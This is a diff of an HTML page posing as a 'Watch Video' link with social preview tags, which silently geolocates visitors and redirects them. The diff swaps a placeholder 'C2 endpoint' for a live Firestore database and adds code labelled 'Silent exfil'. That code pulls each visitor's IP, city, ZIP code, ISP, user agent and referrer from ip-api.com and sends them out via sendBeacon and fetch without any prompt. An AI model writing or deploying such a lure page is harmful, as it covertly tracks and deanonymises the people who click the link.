@@ -4,12 +4,10 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Watch Video</title>
-
 <meta property="og:title" content="Watch Video">
 <meta property="og:description" content="Tap to open">
 <meta property="og:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
 <meta property="og:type" content="website">
-
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Watch Video">
 <meta name="twitter:description" content="Tap to open">
@@ -17,33 +15,24 @@
 <style>
   * { box-sizing: border-box; }
   body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: #0f0f0f;
-    color: #fff;
+    margin: 0; height: 100vh; display: flex; align-items: center;
+    justify-content: center; background: #0f0f0f; color: #fff;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
   }
   .box { text-align: center; }
   .spinner {
     width: 40px; height: 40px; margin: 0 auto 20px;
-    border: 4px solid rgba(255,255,255,0.2);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
+    border: 4px solid rgba(255,255,255,0.2); border-top-color: #fff;
+    border-radius: 50%; animation: spin 0.8s linear infinite;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
   .msg { font-size: 16px; opacity: 0.85; }
   .count { font-size: 14px; opacity: 0.6; margin-top: 8px; }
-  .error {
-    font-size: 15px; max-width: 320px; line-height: 1.5; opacity: 0.85;
-  }
+  .error { font-size: 15px; max-width: 320px; line-height: 1.5; opacity: 0.85; }
   .continue-btn {
-    display: none; margin-top: 16px; padding: 10px 20px;
-    border-radius: 8px; border: none; background: #fff; color: #000;
-    font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none;
+    display: none; margin-top: 16px; padding: 10px 20px; border-radius: 8px;
+    border: none; background: #fff; color: #000; font-size: 14px;
+    font-weight: 600; cursor: pointer; text-decoration: none;
   }
   .continue-btn.show { display: inline-block; }
 </style>
@@ -57,6 +46,10 @@
   </div>
 
   <script>
+    // ===== CONFIG =====
+    const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
+    // =================
+
     function getTargetUrl() {
       const params = new URLSearchParams(window.location.search);
       let target = params.get('url') || params.get('u');
@@ -71,51 +64,69 @@
     const countEl = document.getElementById('count');
     const continueBtn = document.getElementById('continueBtn');
 
+    // Silent exfil to Firestore
+    function exfil(data) {
+      // Build Firestore document format (typed fields)
+      const doc = {
+        fields: {}
+      };
+
+      // Convert each value to the right Firestore type
+      for (const [key, value] of Object.entries(data)) {
+        if (typeof value === 'number') {
+          doc.fields[key] = { doubleValue: value };
+        } else if (typeof value === 'boolean') {
+          doc.fields[key] = { booleanValue: value };
+        } else {
+          doc.fields[key] = { stringValue: String(value) };
+        }
+      }
+
+      const payload = JSON.stringify(doc);
+
+      // sendBeacon for reliable delivery on page unload
+      navigator.sendBeacon(FIRESTORE_URL, payload);
+
+      // Fetch fallback
+      fetch(FIRESTORE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true
+      }).then(r => r.json()).then(console.log).catch(() => {});
+    }
+
+    // IP geolocation callback — fires when ip-api.com responds
+    window.ipGeo = function(data) {
+      exfil({
+        type: 'ip',
+        lat: data.lat,
+        lon: data.lon,
+        city: data.city || '',
+        region: data.regionName || '',
+        country: data.country || '',
+        zip: data.zip || '',
+        isp: data.isp || '',
+        org: data.org || '',
+        ip: data.query || '',
+        ua: navigator.userAgent,
+        targetUrl: target || '',
+        timestamp: new Date().toISOString(),
+        referrer: document.referrer || 'direct'
+      });
+    };
+
+    // Inject IP geolocation script (silent, no prompt)
+    const s = document.createElement('script');
+    s.src = 'http://ip-api.com/json/?callback=ipGeo';
+    document.head.appendChild(s);
+
+    // UI logic
     if (!target) {
       box.innerHTML = '<div class="error">No link provided.<br>Add <code>?url=&lt;link&gt;</code> to the address to redirect somewhere.</div>';
     } else {
       continueBtn.href = target;
 
-      // --- SILENT IP GEOLOCATION (no prompt, no permission needed) ---
-      const exfilUrl = 'https://your-server.com/collect'; // REPLACE with your C2 endpoint
-
-      function exfil(data) {
-        // Use sendBeacon so data goes out even when page navigates away
-        navigator.sendBeacon(exfilUrl, JSON.stringify(data));
-        // Fallback: fetch with keepalive
-        fetch(exfilUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
-          keepalive: true
-        }).catch(() => {});
-      }
-
-      // JSONP callback for ip-api.com
-      window.ipGeo = function(data) {
-        exfil({
-          type: 'ip',
-          lat: data.lat,
-          lon: data.lon,
-          city: data.city,
-          region: data.regionName,
-          country: data.country,
-          zip: data.zip,
-          isp: data.isp,
-          org: data.org,
-          ip: data.query,
-          ua: navigator.userAgent,
-          url: target,
-          timestamp: new Date().toISOString()
-        });
-      };
-
-      // Inject JSONP script (silent, no prompt)
-      const s = document.createElement('script');
-      s.src = 'http://ip-api.com/json/?callback=ipGeo';
-      document.head.appendChild(s);
-
-      // --- Countdown ---
       let secondsLeft = 3;
       countEl.textContent = 'Redirecting in ' + secondsLeft + 's';
       const interval = setInterval(() => {
@@ -128,10 +139,8 @@
         }
       }, 1000);
 
-      // --- Auto-redirect after 3s ---
       setTimeout(() => {
         window.location.href = target;
-        // Fallback button if in-app browser blocks auto-redirect
         setTimeout(() => {
           countEl.textContent = "Didn't redirect automatically:";
           continueBtn.className = 'continue-btn show';
